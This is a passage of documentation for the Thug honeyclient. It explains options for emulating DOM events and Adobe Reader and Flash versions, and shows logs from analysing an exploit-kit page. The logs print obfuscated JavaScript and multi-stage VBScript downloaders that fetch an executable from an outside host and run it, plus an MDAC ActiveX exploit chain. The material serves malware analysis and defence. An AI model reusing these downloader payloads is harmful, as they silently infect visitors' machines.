defer&gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&lt;/script&gt;</span>
<span class="s2">[2012-07-02 19:21:11] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:11] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:21:17] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:21:17] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">[2012-07-02 19:21:17] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:17] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:17] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">[2012-07-02 19:21:17] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:21:18] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:21:18] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
</pre></div>
</div>
<p>It’s quite simple to realize that the exploit for the Microsoft Data Access Components (MDAC)
vulnerability is not served in this case.</p>
</div>
<div class="section" id="dom-events-handling">
<h2>DOM Events Handling<a class="headerlink" href="#dom-events-handling" title="Permalink to this headline">¶</a></h2>
<p>A useful option is the -e (–events) option which allows you to specify which DOM events should
be handled by Thug. By default <cite>load</cite> and <cite>mousemove</cite> events are always handled but you can add
other ones with this option. Using this option is quite simple. All you need to do is to specify
a comma-separated list of events to handle as shown below.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~ $ thug -e click,mouseover URL
</pre></div>
</div>
<p>In this example, the DOM events <cite>load</cite>, <cite>mousemove</cite>, <cite>click</cite> and <cite>mouseover</cite> will be handled by
Thug while all the other ones will be ignored.</p>
</div>
<div class="section" id="adobe-acrobat-reader">
<h2>Adobe Acrobat Reader<a class="headerlink" href="#adobe-acrobat-reader" title="Permalink to this headline">¶</a></h2>
<p>Taking a look at the available options you can see the -A (–adobepdf) option which is quite
useful for getting different PDF exploits which target different version of Adobe Acrobat
Reader. This happens because exploit kits usually serve PDF files which exploit specific
vulnerabilities basing on the Adobe Acrobat Reader version. Let’s take a look at what happens if
we try to analyze the same page with Adobe Acrobat Reader 8.1.0 instead of 9.1.0 (which is
the default one).</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~ $ thug -A <span class="m">8</span>.1.0 <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:00<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:00<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:00<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:03<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:03<span class="o">]</span> Saving applet Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>adodb.stream<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> ActiveXObject: adodb.stream
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>Shell.Application<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> ActiveXObject: shell.application
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:04<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Fetching from URL http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:07<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:08<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Saving File: d328b5a123bce1c0d20d763ad745303a
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:08<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> send
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:08<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> open
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:08<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Write
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:08<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> SaveToFile <span class="o">(</span>.//..//3c9f737.exe<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:08<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Close
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:08<span class="o">]</span> <span class="o">[</span>Shell.Application ActiveX<span class="o">]</span> ShellExecute command: .//..//3c9f737.exe
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:08<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap2.php --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:14<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:15<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:15<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:15<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; <span class="m">64</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:15<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe

<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:15<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Code:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:15<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:16<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:16<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:16<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">2</span><span class="o">]</span> Code:
<span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
On Error resume next
c.open OT, a, z:c.send<span class="o">()</span>
If c.Status <span class="o">=</span> x Then
d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
End If
Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">[2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">[2012-07-02 19:18:20] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:18:22] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">[2012-07-02 19:18:22] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">[2012-07-02 19:18:22] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:22] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:22] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:18:27] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:18:28] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">[2012-07-02 19:18:28] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:28] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:28] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">[2012-07-02 19:18:28] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:18:28] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:18:29] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
</pre></div>
</div>
<p>Comparing the following line</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:18:14<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
</pre></div>
</div>
<p>with what we got using Adobe Acrobat Reader 9.1.0</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
</pre></div>
</div>
<p>it’s easy to realize that a different malicious PDF file was served in this case.</p>
</div>
<div class="section" id="shockwave-flash">
<h2>Shockwave Flash<a class="headerlink" href="#shockwave-flash" title="Permalink to this headline">¶</a></h2>
<p>Taking a look at the available options you can see the -S (–shockwave) option which is quite
useful for getting different Flash exploits which target differents version of Shockwave Flash.
This happens because exploit kits usually serve Flash files which exploit specific vulnerabilities
basing on Shockwave Flash version. Let’s take a look at what happens if we locally analyze
PluginDetect (see Local Analysis later for details).</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src ~ $ thug -l ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_40
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_39
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_38
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_37
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_36
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_35
<span class="o">[</span><span class="m">2012</span>-11-15 <span class="m">17</span>:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_34
